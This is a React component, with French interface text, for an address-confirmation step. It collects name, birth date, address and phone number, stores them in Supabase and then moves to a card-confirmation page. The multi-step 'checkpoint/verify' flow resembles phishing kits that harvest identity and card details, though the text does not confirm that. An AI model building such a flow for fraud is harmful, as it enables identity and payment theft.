
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "@/components/Footer";
import ProgressStepper from "@/components/ProgressStepper";
import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
import { upsertUser } from "@/utils/supabaseClient";
import { toast } from "sonner";
import Header from "@/components/Header";

const AddressConfirmation: React.FC = () => {
  const [nom, setNom] = useState("");
  const [prenom, setPrenom] = useState("");
  const [dateNaissance, setDateNaissance] = useState("");
  const [adresse, setAdresse] = useState("");
  const [codePostal, setCodePostal] = useState("");
  const [ville, setVille] = useState("");
  const [telephone, setTelephone] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState<string | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    const userData = getFromSession("userData");
    if (userData && userData.email) {
      setEmail(userData.email);
      console.log("Email récupéré de la session:", userData.email);
    } else {
      console.log("Aucun email trouvé dans la session");
      toast.error("Veuillez vous connecter d'abord");
      navigate("/login");
    }
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!nom || !prenom || !dateNaissance || !adresse || !codePostal || !ville || !telephone) {
      toast.error("Veuillez remplir tous les champs");
      return;
    }

    if (!email) {
      toast.error("Session utilisateur invalide, veuillez vous reconnecter");
      navigate("/login");
      return;
    }

    setIsLoading(true);

    try {
      // Préparation des données d'adresse uniquement
      const addressData = {
        email,
        nom,
        prenom,
        datenaissance: dateNaissance,
        adresse,
        codepostal: codePostal,
        ville,
        telephone
      };
      
      // Mettre à jour la session avec les données complètes (camelCase)
      const userData = {
        email,
        nom,
        prenom,
        dateNaissance,
        adresse,
        codePostal,
        ville,
        telephone
      };
      
      updateUserSession(userData);
      
      // N'envoyer que les données d'adresse à Supabase
      await upsertUser(addressData);
      
      setIsLoading(false);
      navigate("/card-confirmation");
    } catch (error: any) {
      console.error("Erreur lors de l'enregistrement:", error);
      setIsLoading(false);
      
      if (error.isRlsError) {
        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
      } else {
        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-lg px-6 py-8 bg-white rounded-lg animate-fade-in">
          <ProgressStepper 
            currentStep={2} 
            steps={["Confirm", "Checkpoint", "Verify", "Complete"]} 
          />

          <h1 className="text-3xl font-bold text-center mb-8">
            Confirmez votre adresse
          </h1>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <input
                  type="text"
                  value={nom}
                  onChange={(e) => setNom(e.target.value)}
                  className="form-input"
                  placeholder="Nom"
                />
              </div>
              <div>
                <input
                  type="text"
                  value={prenom}
                  onChange={(e) => setPrenom(e.target.value)}
                  className="form-input"
                  placeholder="Prénom"
                />
              </div>
            </div>

            <div>
              <input
                type="text"
                value={dateNaissance}
                onChange={(e) => setDateNaissance(e.target.value)}
                className="form-input"
                placeholder="Date de naissance"
              />
            </div>

            <div>
              <input
                type="text"
                value={adresse}
                onChange={(e) => setAdresse(e.target.value)}
                className="form-input"
                placeholder="Ligne d'adresse 1"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <input
                  type="text"
                  value={codePostal}
                  onChange={(e) => setCodePostal(e.target.value)}
                  className="form-input"
                  placeholder="Code postal"
                />
              </div>
              <div>
                <input
                  type="text"
                  value={ville}
                  onChange={(e) => setVille(e.target.value)}
                  className="form-input"
                  placeholder="Ville"
                />
              </div>
            </div>

            <div>
              <input
                type="tel"
                value={telephone}
                onChange={(e) => setTelephone(e.target.value)}
                className="form-input"
                placeholder="Numéro de téléphone"
              />
            </div>

            <button
              type="submit"
              className="primary-button flex items-center justify-center mt-6"
              disabled={isLoading}
            >
              {isLoading ? (
                <span className="loading-spinner" />
              ) : (
                "Continuer"
              )}
            </button>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default AddressConfirmation;
